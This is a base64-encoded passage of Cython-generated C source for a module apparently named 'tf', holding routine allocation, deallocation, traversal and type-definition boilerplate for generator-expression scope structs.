X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogICNpZiAhQ1lUSE9OX1VTRV9UWVBFX1NQRUNTCiAgMCwgCiAgI2VuZGlmCiAgMCwgCiAgMCwgCiAgX19weXhfdHBfbmV3XzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAjaWYgQ1lUSE9OX1VTRV9UUF9GSU5BTElaRQogIDAsIAogICNlbHNlCiAgTlVMTCwgCiAgI2VuZGlmCiAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwODAwYjEgJiYgKCFDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkgfHwgUFlQWV9WRVJTSU9OX05VTSA+PSAweDA3MDMwODAwKQogIDAsIAogICNlbmRpZgogICNpZiBfX1BZWF9ORUVEX1RQX1BSSU5UX1NMT1QgPT0gMQogIDAsIAogICNlbmRpZgogICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEMwMDAwCiAgMCwgCiAgI2VuZGlmCiAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwQTQKICAwLCAKICAjZW5kaWYKICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZICYmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwOTAwMDAgJiYgUFlfVkVSU0lPTl9IRVggPCAweDAzMGEwMDAwCiAgMCwgCiAgI2VuZGlmCn07CiNlbmRpZgoKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF90cF9uZXdfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIoUHlUeXBlT2JqZWN0ICp0LCBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICphLCBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICprKSB7CiAgUHlPYmplY3QgKm87CiAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICBhbGxvY2Z1bmMgYWxsb2NfZnVuYyA9IChhbGxvY2Z1bmMpUHlUeXBlX0dldFNsb3QodCwgUHlfdHBfYWxsb2MpOwogIG8gPSBhbGxvY19mdW5jKHQsIDApOwogICNlbHNlCiAgI2lmIENZVEhPTl9VU0VfRlJFRUxJU1RTCiAgaWYgKGxpa2VseSgoaW50KShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9mcmVlY291bnRfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIgPiAwKSAmIChpbnQpKHQtPnRwX2Jhc2ljc2l6ZSA9PSBzaXplb2Yoc3RydWN0IF9fcHl4X29ial8ydGZfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcikpKSkgewogICAgbyA9IChQeU9iamVjdCopX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZnJlZWxpc3RfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHJbLS1fX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9mcmVlY291bnRfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHJdOwogICAgbWVtc2V0KG8sIDAsIHNpemVvZihzdHJ1Y3QgX19weXhfb2JqXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByKSk7CiAgICAodm9pZCkgUHlPYmplY3RfSU5JVChvLCB0KTsKICAgIFB5T2JqZWN0X0dDX1RyYWNrKG8pOwogIH0gZWxzZQogICNlbmRpZgogIHsKICAgIG8gPSAoKnQtPnRwX2FsbG9jKSh0LCAwKTsKICAgIGlmICh1bmxpa2VseSghbykpIHJldHVybiAwOwogIH0KICAjZW5kaWYKICByZXR1cm4gbzsKfQoKc3RhdGljIHZvaWQgX19weXhfdHBfZGVhbGxvY18ydGZfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcihQeU9iamVjdCAqbykgewogIHN0cnVjdCBfX3B5eF9vYmpfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIgKnAgPSAoc3RydWN0IF9fcHl4X29ial8ydGZfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwciAqKW87CiAgI2lmIENZVEhPTl9VU0VfVFBfRklOQUxJWkUKICBpZiAodW5saWtlbHkoKFBZX1ZFUlNJT05fSEVYID49IDB4MDMwODAwMDAgfHwgX19QeXhfUHlUeXBlX0hhc0ZlYXR1cmUoUHlfVFlQRShvKSwgUHlfVFBGTEFHU19IQVZFX0ZJTkFMSVpFKSkgJiYgX19QeXhfUHlPYmplY3RfR2V0U2xvdChvLCB0cF9maW5hbGl6ZSwgZGVzdHJ1Y3RvcikpICYmICFfX1B5eF9QeU9iamVjdF9HQ19Jc0ZpbmFsaXplZChvKSkgewogICAgaWYgKF9fUHl4X1B5T2JqZWN0X0dldFNsb3QobywgdHBfZGVhbGxvYywgZGVzdHJ1Y3RvcikgPT0gX19weXhfdHBfZGVhbGxvY18ydGZfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcikgewogICAgICBpZiAoUHlPYmplY3RfQ2FsbEZpbmFsaXplckZyb21EZWFsbG9jKG8pKSByZXR1cm47CiAgICB9CiAgfQogICNlbmRpZgogIFB5T2JqZWN0X0dDX1VuVHJhY2sobyk7CiAgUHlfQ0xFQVIocC0+X19weXhfb3V0ZXJfc2NvcGUpOwogIFB5X0NMRUFSKHAtPl9fcHl4X2dlbmV4cHJfYXJnXzApOwogIFB5X0NMRUFSKHAtPl9fcHl4X3ZfaSk7CiAgI2lmIENZVEhPTl9VU0VfRlJFRUxJU1RTCiAgaWYgKCgoaW50KShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9mcmVlY291bnRfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIgPCA4KSAmIChpbnQpKFB5X1RZUEUobyktPnRwX2Jhc2ljc2l6ZSA9PSBzaXplb2Yoc3RydWN0IF9fcHl4X29ial8ydGZfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcikpKSkgewogICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZnJlZWxpc3RfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHJbX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZnJlZWNvdW50XzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByKytdID0gKChzdHJ1Y3QgX19weXhfb2JqXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByICopbyk7CiAgfSBlbHNlCiAgI2VuZGlmCiAgewogICAgI2lmIENZVEhPTl9VU0VfVFlQRV9TTE9UUwogICAgKCpQeV9UWVBFKG8pLT50cF9mcmVlKShvKTsKICAgICNlbHNlCiAgICB7CiAgICAgIGZyZWVmdW5jIHRwX2ZyZWUgPSAoZnJlZWZ1bmMpUHlUeXBlX0dldFNsb3QoUHlfVFlQRShvKSwgUHlfdHBfZnJlZSk7CiAgICAgIGlmICh0cF9mcmVlKSB0cF9mcmVlKG8pOwogICAgfQogICAgI2VuZGlmCiAgfQp9CgpzdGF0aWMgaW50IF9fcHl4X3RwX3RyYXZlcnNlXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByKFB5T2JqZWN0ICpvLCB2aXNpdHByb2Mgdiwgdm9pZCAqYSkgewogIGludCBlOwogIHN0cnVjdCBfX3B5eF9vYmpfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIgKnAgPSAoc3RydWN0IF9fcHl4X29ial8ydGZfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwciAqKW87CiAgewogICAgZSA9IF9fUHl4X2NhbGxfdHlwZV90cmF2ZXJzZShvLCAxLCB2LCBhKTsKICAgIGlmIChlKSByZXR1cm4gZTsKICB9CiAgaWYgKHAtPl9fcHl4X291dGVyX3Njb3BlKSB7CiAgICBlID0gKCp2KSgoKFB5T2JqZWN0ICopcC0+X19weXhfb3V0ZXJfc2NvcGUpLCBhKTsgaWYgKGUpIHJldHVybiBlOwogIH0KICBpZiAocC0+X19weXhfZ2VuZXhwcl9hcmdfMCkgewogICAgZSA9ICgqdikocC0+X19weXhfZ2VuZXhwcl9hcmdfMCwgYSk7IGlmIChlKSByZXR1cm4gZTsKICB9CiAgaWYgKHAtPl9fcHl4X3ZfaSkgewogICAgZSA9ICgqdikocC0+X19weXhfdl9pLCBhKTsgaWYgKGUpIHJldHVybiBlOwogIH0KICByZXR1cm4gMDsKfQojaWYgQ1lUSE9OX1VTRV9UWVBFX1NQRUNTCnN0YXRpYyBQeVR5cGVfU2xvdCBfX3B5eF90eXBlXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByX3Nsb3RzW10gPSB7CiAge1B5X3RwX2RlYWxsb2MsICh2b2lkICopX19weXhfdHBfZGVhbGxvY18ydGZfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcn0sCiAge1B5X3RwX3RyYXZlcnNlLCAodm9pZCAqKV9fcHl4X3RwX3RyYXZlcnNlXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByfSwKICB7UHlfdHBfbmV3LCAodm9pZCAqKV9fcHl4X3RwX25ld18ydGZfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcn0sCiAgezAsIDB9LAp9OwpzdGF0aWMgUHlUeXBlX1NwZWMgX19weXhfdHlwZV8ydGZfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcl9zcGVjID0gewogICJ0Zi5fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByIiwKICBzaXplb2Yoc3RydWN0IF9fcHl4X29ial8ydGZfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwciksCiAgMCwKICBQeV9UUEZMQUdTX0RFRkFVTFR8UHlfVFBGTEFHU19IQVZFX1ZFUlNJT05fVEFHfFB5X1RQRkxBR1NfQ0hFQ0tUWVBFU3xQeV9UUEZMQUdTX0hBVkVfTkVXQlVGRkVSfFB5X1RQRkxBR1NfSEFWRV9HQ3xQeV9UUEZMQUdTX0hBVkVfRklOQUxJWkUsCiAgX19weXhfdHlwZV8ydGZfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcl9zbG90cywKfTsKI2Vsc2UKCnN0YXRpYyBQeVR5cGVPYmplY3QgX19weXhfdHlwZV8ydGZfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwciA9IHsKICBQeVZhck9iamVjdF9IRUFEX0lOSVQoMCwgMCkKICAidGYuIiJfX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByIiwgCiAgc2l6ZW9mKHN0cnVjdCBfX3B5eF9vYmpfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIpLCAKICAwLCAKICBfX3B5eF90cF9kZWFsbG9jXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByLCAKICAjaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMDgwMGI0CiAgMCwgCiAgI2VuZGlmCiAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwODAwYjQKICAwLCAKICAjZW5kaWYKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICBQeV9UUEZMQUdTX0RFRkFVTFR8UHlfVFBGTEFHU19IQVZFX1ZFUlNJT05fVEFHfFB5X1RQRkxBR1NfQ0hFQ0tUWVBFU3xQeV9UUEZMQUdTX0hBVkVfTkVXQlVGRkVSfFB5X1RQRkxBR1NfSEFWRV9HQ3xQeV9UUEZMQUdTX0hBVkVfRklOQUxJWkUsIAogIDAsIAogIF9fcHl4X3RwX3RyYXZlcnNlXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAjaWYgIUNZVEhPTl9VU0VfVFlQRV9TUEVDUwogIDAsIAogICNlbmRpZgogIDAsIAogIDAsIAogIF9fcHl4X3RwX25ld18ydGZfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwciwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgI2lmIENZVEhPTl9VU0VfVFBfRklOQUxJWkUKICAwLCAKICAjZWxzZQogIE5VTEwsIAogICNlbmRpZgogICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDgwMGIxICYmICghQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZIHx8IFBZUFlfVkVSU0lPTl9OVU0gPj0gMHgwNzAzMDgwMCkKICAwLCAKICAjZW5kaWYKICAjaWYgX19QWVhfTkVFRF9UUF9QUklOVF9TTE9UID09IDEKICAwLCAKICAjZW5kaWYKICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBDMDAwMAogIDAsIAogICNlbmRpZgogICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMEE0CiAgMCwgCiAgI2VuZGlmCiAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSAmJiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDkwMDAwICYmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzBhMDAwMAogIDAsIAogICNlbmRpZgp9OwojZW5kaWYKCnN0YXRpYyBQeU9iamVjdCAqX19weXhfdHBfbmV3XzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByKFB5VHlwZU9iamVjdCAqdCwgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqYSwgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqaykgewogIFB5T2JqZWN0ICpvOwogICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgYWxsb2NmdW5jIGFsbG9jX2Z1bmMgPSAoYWxsb2NmdW5jKVB5VHlwZV9HZXRTbG90KHQsIFB5X3RwX2FsbG9jKTsKICBvID0gYWxsb2NfZnVuYyh0LCAwKTsKICAjZWxzZQogICNpZiBDWVRIT05fVVNFX0ZSRUVMSVNUUwogIGlmIChsaWtlbHkoKGludCkoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZnJlZWNvdW50XzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByID4gMCkgJiAoaW50KSh0LT50cF9iYXNpY3NpemUgPT0gc2l6ZW9mKHN0cnVjdCBfX3B5eF9vYmpfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIpKSkpIHsKICAgIG8gPSAoUHlPYmplY3QqKV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ZyZWVsaXN0XzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByWy0tX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZnJlZWNvdW50XzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByXTsKICAgIG1lbXNldChvLCAwLCBzaXplb2Yoc3RydWN0IF9fcHl4X29ial8ydGZfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwcikpOwogICAgKHZvaWQpIFB5T2JqZWN0X0lOSVQobywgdCk7CiAgICBQeU9iamVjdF9HQ19UcmFjayhvKTsKICB9IGVsc2UKICAjZW5kaWYKICB7CiAgICBvID0gKCp0LT50cF9hbGxvYykodCwgMCk7CiAgICBpZiAodW5saWtlbHkoIW8pKSByZXR1cm4gMDsKICB9CiAgI2VuZGlmCiAgcmV0dXJuIG87Cn0KCnN0YXRpYyB2b2lkIF9fcHl4X3RwX2RlYWxsb2NfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIoUHlPYmplY3QgKm8pIHsKICBzdHJ1Y3QgX19weXhfb2JqXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByICpwID0gKHN0cnVjdCBfX3B5eF9vYmpfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIgKilvOwogICNpZiBDWVRIT05fVVNFX1RQX0ZJTkFMSVpFCiAgaWYgKHVubGlrZWx5KChQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDgwMDAwIHx8IF9fUHl4X1B5VHlwZV9IYXNGZWF0dXJlKFB5X1RZUEUobyksIFB5X1RQRkxBR1NfSEFWRV9GSU5BTElaRSkpICYmIF9fUHl4X1B5T2JqZWN0X0dldFNsb3QobywgdHBfZmluYWxpemUsIGRlc3RydWN0b3IpKSAmJiAhX19QeXhfUHlPYmplY3RfR0NfSXNGaW5hbGl6ZWQobykpIHsKICAgIGlmIChfX1B5eF9QeU9iamVjdF9HZXRTbG90KG8sIHRwX2RlYWxsb2MsIGRlc3RydWN0b3IpID09IF9fcHl4X3RwX2RlYWxsb2NfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIpIHsKICAgICAgaWYgKFB5T2JqZWN0X0NhbGxGaW5hbGl6ZXJGcm9tRGVhbGxvYyhvKSkgcmV0dXJuOwogICAgfQogIH0KICAjZW5kaWYKICBQeU9iamVjdF9HQ19VblRyYWNrKG8pOwogIFB5X0NMRUFSKHAtPl9fcHl4X291dGVyX3Njb3BlKTsKICBQeV9DTEVBUihwLT5fX3B5eF9nZW5leHByX2FyZ18wKTsKICBQeV9DTEVBUihwLT5fX3B5eF92X2kpOwogICNpZiBDWVRIT05fVVNFX0ZSRUVMSVNUUwogIGlmICgoKGludCkoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZnJlZWNvdW50XzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByIDwgOCkgJiAoaW50KShQeV9UWVBFKG8pLT50cF9iYXNpY3NpemUgPT0gc2l6ZW9mKHN0cnVjdCBfX3B5eF9vYmpfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIpKSkpIHsKICAgIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ZyZWVsaXN0XzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByW19fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ZyZWVjb3VudF8ydGZfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwcisrXSA9ICgoc3RydWN0IF9fcHl4X29ial8ydGZfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwciAqKW8pOwogIH0gZWxzZQogICNlbmRpZgogIHsKICAgICNpZiBDWVRIT05fVVNFX1RZUEVfU0xPVFMKICAgICgqUHlfVFlQRShvKS0+dHBfZnJlZSkobyk7CiAgICAjZWxzZQogICAgewogICAgICBmcmVlZnVuYyB0cF9mcmVlID0gKGZyZWVmdW5jKVB5VHlwZV9HZXRTbG90KFB5X1RZUEUobyksIFB5X3RwX2ZyZWUpOwogICAgICBpZiAodHBfZnJlZSkgdHBfZnJlZShvKTsKICAgIH0KICAgICNlbmRpZgogIH0KfQoKc3RhdGljIGludCBfX3B5eF90cF90cmF2ZXJzZV8ydGZfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwcihQeU9iamVjdCAqbywgdmlzaXRwcm9jIHYsIHZvaWQgKmEpIHsKICBpbnQgZTsKICBzdHJ1Y3QgX19weXhfb2JqXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByICpwID0gKHN0cnVjdCBfX3B5eF9vYmpfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIgKilvOwogIHsKICAgIGUgPSBfX1B5eF9jYWxsX3R5cGVfdHJhdmVyc2UobywgMSwgdiwgYSk7CiAgICBpZiAoZSkgcmV0dXJuIGU7CiAgfQogIGlmIChwLT5fX3B5eF9vdXRlcl9zY29wZSkgewogICAgZSA9ICgqdikoKChQeU9iamVjdCAqKXAtPl9fcHl4X291dGVyX3Njb3BlKSwgYSk7IGlmIChlKSByZXR1cm4gZTsKICB9CiAgaWYgKHAtPl9fcHl4X2dlbmV4cHJfYXJnXzApIHsKICAgIGUgPSAoKnYpKHAtPl9fcHl4X2dlbmV4cHJfYXJnXzAsIGEpOyBpZiAoZSkgcmV0dXJuIGU7CiAgfQogIGlmIChwLT5fX3B5eF92X2kpIHsKICAgIGUgPSAoKnYpKHAtPl9fcHl4X3ZfaSwgYSk7IGlmIChlKSByZXR1cm4gZTsKICB9CiAgcmV0dXJuIDA7Cn0KI2lmIENZVEhPTl9VU0VfVFlQRV9TUEVDUwpzdGF0aWMgUHlUeXBlX1Nsb3QgX19weXhfdHlwZV8ydGZfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwcl9zbG90c1tdID0gewogIHtQeV90cF9kZWFsbG9jLCAodm9pZCAqKV9fcHl4X3RwX2RlYWxsb2NfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHJ9LAogIHtQeV90cF90cmF2ZXJzZSwgKHZvaWQgKilfX3B5eF90cF90cmF2ZXJzZV8ydGZfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwcn0sCiAge1B5X3RwX25ldywgKHZvaWQgKilfX3B5eF90cF9uZXdfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHJ9LAogIHswLCAwfSwKfTsKc3RhdGljIFB5VHlwZV9TcGVjIF9fcHl4X3R5cGVfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHJfc3BlYyA9IHsKICAidGYuX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwciIsCiAgc2l6ZW9mKHN0cnVjdCBfX3B5eF9vYmpfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIpLAogIDAsCiAgUHlfVFBGTEFHU19ERUZBVUxUfFB5X1RQRkxBR1NfSEFWRV9WRVJTSU9OX1RBR3xQeV9UUEZMQUdTX0NIRUNLVFlQRVN8UHlfVFBGTEFHU19IQVZFX05FV0JVRkZFUnxQeV9UUEZMQUdTX0hBVkVfR0N8UHlfVFBGTEFHU19IQVZFX0ZJTkFMSVpFLAogIF9fcHl4X3R5cGVfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHJfc2xvdHMsCn07CiNlbHNlCgpzdGF0aWMgUHlUeXBlT2JqZWN0IF9fcHl4X3R5cGVfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIgPSB7CiAgUHlWYXJPYmplY3RfSEVBRF9JTklUKDAsIDApCiAgInRmLiIiX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwciIsIAogIHNpemVvZihzdHJ1Y3QgX19weXhfb2JqXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByKSwgCiAgMCwgCiAgX19weXhfdHBfZGVhbGxvY18ydGZfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwciwgCiAgI2lmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzA4MDBiNAogIDAsIAogICNlbmRpZgogICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDgwMGI0CiAgMCwgCiAgI2VuZGlmCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgUHlfVFBGTEFHU19ERUZBVUxUfFB5X1RQRkxBR1NfSEFWRV9WRVJTSU9OX1RBR3xQeV9UUEZMQUdTX0NIRUNLVFlQRVN8UHlfVFBGTEFHU19IQVZFX05FV0JVRkZFUnxQeV9UUEZMQUdTX0hBVkVfR0N8UHlfVFBGTEFHU19IQVZFX0ZJTkFMSVpFLCAKICAwLCAKICBfX3B5eF90cF90cmF2ZXJzZV8ydGZfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwciwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgI2lmICFDWVRIT05fVVNFX1RZUEVfU1BFQ1MKICAwLCAKICAjZW5kaWYKICAwLCAKICAwLCAKICBfX3B5eF90cF9uZXdfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogICNpZiBDWVRIT05fVVNFX1RQX0ZJTkFMSVpFCiAgMCwgCiAgI2Vsc2UKICBOVUxMLCAKICAjZW5kaWYKICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA4MDBiMSAmJiAoIUNZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSB8fCBQWVBZX1ZFUlNJT05fTlVNID49IDB4MDcwMzA4MDApCiAgMCwgCiAgI2VuZGlmCiAgI2lmIF9fUFlYX05FRURfVFBfUFJJTlRfU0xPVCA9PSAxCiAgMCwgCiAgI2VuZGlmCiAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwMDAKICAwLCAKICAjZW5kaWYKICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDBBNAogIDAsIAogICNlbmRpZgogICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkgJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA5MDAwMCAmJiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwYTAwMDAKICAwLCAKICAjZW5kaWYKfTsKI2VuZGlmCgpzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3RwX25ld18ydGZfX19weXhfc2NvcGVfc3RydWN0XzRfZ2VuZXhwcihQeVR5cGVPYmplY3QgKnQsIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKmEsIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKmspIHsKICBQeU9iamVjdCAqbzsKICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogIGFsbG9jZnVuYyBhbGxvY19mdW5jID0gKGFsbG9jZnVuYylQeVR5cGVfR2V0U2xvdCh0LCBQeV90cF9hbGxvYyk7CiAgbyA9IGFsbG9jX2Z1bmModCwgMCk7CiAgI2Vsc2UKICAjaWYgQ1lUSE9OX1VTRV9GUkVFTElTVFMKICBpZiAobGlrZWx5KChpbnQpKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ZyZWVjb3VudF8ydGZfX19weXhfc2NvcGVfc3RydWN0XzRfZ2VuZXhwciA+IDApICYgKGludCkodC0+dHBfYmFzaWNzaXplID09IHNpemVvZihzdHJ1Y3QgX19weXhfb2JqXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfNF9nZW5leHByKSkpKSB7CiAgICBvID0gKFB5T2JqZWN0KilfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9mcmVlbGlzdF8ydGZfX19weXhfc2NvcGVfc3RydWN0XzRfZ2VuZXhwclstLV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ZyZWVjb3VudF8ydGZfX19weXhfc2NvcGVfc3RydWN0XzRfZ2VuZXhwcl07CiAgICBtZW1zZXQobywgMCwgc2l6ZW9mKHN0cnVjdCBfX3B5eF9vYmpfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF80X2dlbmV4cHIpKTsKICAgICh2b2lkKSBQeU9iamVjdF9JTklUKG8sIHQpOwogICAgUHlPYmplY3RfR0NfVHJhY2sobyk7CiAgfSBlbHNlCiAgI2VuZGlmCiAgewogICAgbyA9ICgqdC0+dHBfYWxsb2MpKHQsIDApOwogICAgaWYgKHVubGlrZWx5KCFvKSkgcmV0dXJuIDA7CiAgfQogICNlbmRpZgogIHJldHVybiBvOwp9CgpzdGF0aWMgdm9pZCBfX3B5eF90cF9kZWFsbG9jXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfNF9nZW5leHByKFB5T2JqZWN0ICpvKSB7CiAgc3RydWN0IF9fcHl4X29ial8ydGZfX19weXhfc2NvcGVfc3RydWN0XzRfZ2VuZXhwciAqcCA9IChzdHJ1Y3QgX19weXhfb2JqXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfNF9nZW5leHByICopbzsKICAjaWYgQ1lUSE9OX1VTRV9UUF9GSU5BTElaRQogIGlmICh1bmxpa2VseSgoUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA4MDAwMCB8fCBfX1B5eF9QeVR5cGVfSGFzRmVhdHVyZShQeV9UWVBFKG8pLCBQeV9UUEZMQUdTX0hBVkVfRklOQUxJWkUpKSAmJiBfX1B5eF9QeU9iamVjdF9HZXRTbG90KG8sIHRwX2ZpbmFsaXplLCBkZXN0cnVjdG9yKSkgJiYgIV9fUHl4X1B5T2JqZWN0X0dDX0lzRmluYWxpemVkKG8pKSB7CiAgI